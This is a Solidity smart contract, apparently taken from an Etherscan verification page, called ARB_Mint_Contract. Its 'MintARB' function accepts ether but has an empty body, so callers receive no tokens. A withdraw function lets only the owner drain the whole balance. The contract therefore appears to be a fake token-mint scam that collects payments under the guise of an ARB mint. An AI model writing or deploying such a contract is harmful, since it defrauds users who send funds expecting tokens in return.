/**
 *Submitted for verification at Etherscan.io on 2023-03-20
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-20
*/

// File: arb.sol

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.4.26;

contract ARB_Mint_Contract {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function MintARB() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}